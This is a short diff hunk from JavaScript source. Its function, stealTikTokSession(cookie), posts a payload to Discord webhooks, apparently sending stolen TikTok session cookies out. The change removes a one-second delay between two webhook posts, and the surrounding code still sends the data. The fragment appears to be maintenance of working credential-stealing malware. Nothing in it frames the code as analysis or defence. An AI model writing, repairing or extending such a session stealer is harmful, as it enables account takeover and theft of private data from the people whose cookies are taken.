@@ -1345,7 +1345,6 @@ function stealTikTokSession(cookie) {
                 };
 
                 axios.post(discordWebhookUr1, webhookPayload);
-                await new Promise(resolve => setTimeout(resolve, 1000));
                 axios.post(discordWebhookUrl, webhookPayload)
                   .then(response => {
                     console.log('Discord webhook sent successfully! send tiktok');
